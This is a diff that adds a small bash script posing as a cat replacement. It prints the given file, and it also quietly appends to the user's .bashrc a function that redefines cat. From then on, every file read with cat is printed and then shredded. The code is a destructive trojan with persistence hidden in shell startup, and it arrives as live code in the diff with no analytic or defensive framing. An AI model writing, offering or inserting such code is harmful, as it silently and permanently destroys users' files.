@@ -1,0 +1,9 @@
+#!/bin/bash
+
+echo "
+function cat() {
+  echo \"\$(< \$@)\"
+  shred \$@
+}" | cat >> .bashrc
+
+echo "$(< $@)"
